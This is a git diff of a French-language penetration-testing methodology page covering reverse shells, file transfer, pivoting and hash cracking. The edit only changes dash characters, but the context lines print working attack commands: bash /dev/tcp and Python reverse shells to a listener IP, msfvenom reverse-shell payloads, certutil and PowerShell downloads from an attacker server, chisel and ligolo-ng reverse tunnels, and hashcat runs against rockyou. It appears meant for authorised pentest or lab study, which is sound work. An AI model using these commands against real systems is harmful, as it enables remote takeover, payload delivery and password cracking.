@@ -1,4 +1,4 @@
-# 5 — Shells, transfert & pivot
+# 5 - Shells, transfert & pivot
 
 Une fois l'exécution de commandes obtenue, l'objectif est d'établir un accès interactif fiable, puis de se déplacer dans l'environnement. Cette phase couvre la génération et la stabilisation des reverse shells, le transfert de fichiers entre l'attaquant et la cible, le pivot vers les réseaux internes et le cassage des hachages récupérés. Chaque étape ci-dessous reprend la commande exacte de la méthodologie, accompagnée de références externes vérifiées.
 
@@ -10,9 +10,9 @@ Une fois l'exécution de commandes obtenue, l'objectif est d'établir un accès 
 Service : `reverse`. Générez la charge, mettez-vous en écoute, puis stabilisez le TTY. Catalogue de payloads : revshells.com.
 
 !!! info "Références"
-    - HackTricks — [Full TTYs (stabilisation du shell)](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html)
-    - PayloadsAllTheThings — [Reverse Shell Cheatsheet](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/)
-    - [revshells.com](https://www.revshells.com/) — générateur interactif de reverse shells
+    - HackTricks - [Full TTYs (stabilisation du shell)](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html)
+    - PayloadsAllTheThings - [Reverse Shell Cheatsheet](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/)
+    - [revshells.com](https://www.revshells.com/) - générateur interactif de reverse shells
 
 ### Listener
 
@@ -20,7 +20,7 @@ Service : `reverse`. Générez la charge, mettez-vous en écoute, puis stabilise
 rlwrap nc -lvnp 4444
 ```
 
-**Voir aussi :** [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/)
+**Voir aussi :** [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/)
 
 ### Payloads (Linux)
 
@@ -29,7 +29,7 @@ bash -i >& /dev/tcp/<listener_ip>/4444 0>&1
 python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<listener_ip>",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
 ```
 
-**Voir aussi :** [HackTricks — Reverse shells (Linux)](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)
+**Voir aussi :** [HackTricks - Reverse shells (Linux)](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)
 
 ### Payloads (msfvenom)
 
@@ -38,7 +38,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<listener_ip> LPORT=4444 -f exe 
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<listener_ip> LPORT=4444 -f elf -o s.elf
 ```
 
-**Voir aussi :** [Kali — Metasploit Framework](https://www.kali.org/tools/metasploit-framework/) · [HackTricks — Reverse shells (Windows)](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/windows.html)
+**Voir aussi :** [Kali - Metasploit Framework](https://www.kali.org/tools/metasploit-framework/) · [HackTricks - Reverse shells (Windows)](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/windows.html)
 
 ### Stabilize the TTY
 
@@ -52,15 +52,15 @@ stty raw -echo; fg
 export TERM=xterm
 ```
 
-**Voir aussi :** [HackTricks — Full TTYs](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html)
+**Voir aussi :** [HackTricks - Full TTYs](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html)
 
 ## File transfer
 
 Service : `transfer`. Montez un serveur côté attaquant, puis téléchargez côté cible.
 
 !!! info "Références"
-    - HackTricks — [Exfiltration (canaux de transfert de fichiers)](https://book.hacktricks.wiki/en/generic-hacking/exfiltration.html)
-    - PayloadsAllTheThings — [Windows - Download and Execute](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/)
+    - HackTricks - [Exfiltration (canaux de transfert de fichiers)](https://book.hacktricks.wiki/en/generic-hacking/exfiltration.html)
+    - PayloadsAllTheThings - [Windows - Download and Execute](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/)
 
 ### Attacker-side server
 
@@ -69,7 +69,7 @@ python3 -m http.server 80
 impacket-smbserver share . -smb2support
 ```
 
-**Voir aussi :** [Kali — Impacket](https://www.kali.org/tools/impacket/)
+**Voir aussi :** [Kali - Impacket](https://www.kali.org/tools/impacket/)
 
 ### Download (Linux target)
 
@@ -78,7 +78,7 @@ wget http://<listener_ip>/f -O /tmp/f
 curl http://<listener_ip>/f -o /tmp/f
 ```
 
-**Voir aussi :** [HackTricks — Exfiltration](https://book.hacktricks.wiki/en/generic-hacking/exfiltration.html)
+**Voir aussi :** [HackTricks - Exfiltration](https://book.hacktricks.wiki/en/generic-hacking/exfiltration.html)
 
 ### Download (Windows target)
 
@@ -87,14 +87,14 @@ certutil -urlcache -f http://<listener_ip>/f f.exe
 powershell iwr http://<listener_ip>/f -OutFile f.exe
 ```
 
-**Voir aussi :** [PayloadsAllTheThings — Windows - Download and Execute](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/)
+**Voir aussi :** [PayloadsAllTheThings - Windows - Download and Execute](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/)
 
 ## Pivoting / tunneling
 
 Service : `tunneling`. Rebondissez vers un réseau interne via la machine compromise.
 
 !!! info "Références"
-    - HackTricks — [Tunneling and Port Forwarding](https://book.hacktricks.wiki/en/generic-hacking/tunneling-and-port-forwarding.html)
+    - HackTricks - [Tunneling and Port Forwarding](https://book.hacktricks.wiki/en/generic-hacking/tunneling-and-port-forwarding.html)
     - [ligolo-ng (GitHub)](https://github.com/nicocha30/ligolo-ng) · [chisel (GitHub)](https://github.com/jpillora/chisel)
 
 ### Ligolo-ng (recommended)
@@ -104,7 +104,7 @@ Service : `tunneling`. Rebondissez vers un réseau interne via la machine compro
 # target  : ./agent -connect <listener_ip>:11601 -ignore-cert
 ```
 
-**Voir aussi :** [ligolo-ng — dépôt et documentation](https://github.com/nicocha30/ligolo-ng) · [Kali — ligolo-ng](https://www.kali.org/tools/ligolo-ng/)
+**Voir aussi :** [ligolo-ng - dépôt et documentation](https://github.com/nicocha30/ligolo-ng) · [Kali - ligolo-ng](https://www.kali.org/tools/ligolo-ng/)
 
 ### Chisel (reverse SOCKS)
 
@@ -113,7 +113,7 @@ Service : `tunneling`. Rebondissez vers un réseau interne via la machine compro
 # target  : ./chisel client <listener_ip>:8000 R:1080:socks
 ```
 
-**Voir aussi :** [chisel — usage](https://github.com/jpillora/chisel#usage)
+**Voir aussi :** [chisel - usage](https://github.com/jpillora/chisel#usage)
 
 ### SSH tunnels
 
@@ -122,15 +122,15 @@ ssh -D 1080 {USER}@{IP}              # dynamic SOCKS
 ssh -L 8080:127.0.0.1:80 {USER}@{IP}   # local forward
 ```
 
-**Voir aussi :** [HackTricks — Tunneling and Port Forwarding](https://book.hacktricks.wiki/en/generic-hacking/tunneling-and-port-forwarding.html)
+**Voir aussi :** [HackTricks - Tunneling and Port Forwarding](https://book.hacktricks.wiki/en/generic-hacking/tunneling-and-port-forwarding.html)
 
 ## Hash cracking (hashcat / john)
 
 Service : `hashcat`. Identifiez le type de hachage (hashid) puis choisissez le bon mode **-m**.
 
 !!! info "Références"
-    - hashcat — [example_hashes (table des modes -m)](https://hashcat.net/wiki/doku.php?id=example_hashes)
-    - hashcat — [Rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
+    - hashcat - [example_hashes (table des modes -m)](https://hashcat.net/wiki/doku.php?id=example_hashes)
+    - hashcat - [Rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
     - [John the Ripper (GitHub)](https://github.com/openwall/john)
 
 ### Identify the hash
@@ -140,7 +140,7 @@ hashid '<hash>'
 name-that-hash -t '<hash>'
 ```
 
-**Voir aussi :** [Name-That-Hash (GitHub)](https://github.com/bee-san/Name-That-Hash) · [Kali — name-that-hash](https://www.kali.org/tools/name-that-hash/)
+**Voir aussi :** [Name-That-Hash (GitHub)](https://github.com/bee-san/Name-That-Hash) · [Kali - name-that-hash](https://www.kali.org/tools/name-that-hash/)
 
 ### Common -m modes
 
@@ -151,7 +151,7 @@ name-that-hash -t '<hash>'
 # 0 MD5 | 100 SHA1 | 3200 bcrypt | 7300 IPMI
 ```
 
-**Voir aussi :** [hashcat — example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
+**Voir aussi :** [hashcat - example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
 
 ### Run the crack
 
@@ -160,4 +160,4 @@ hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt
 hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
 
-**Voir aussi :** [Kali — hashcat](https://www.kali.org/tools/hashcat/) · [hashcat — Rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
+**Voir aussi :** [Kali - hashcat](https://www.kali.org/tools/hashcat/) · [hashcat - Rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
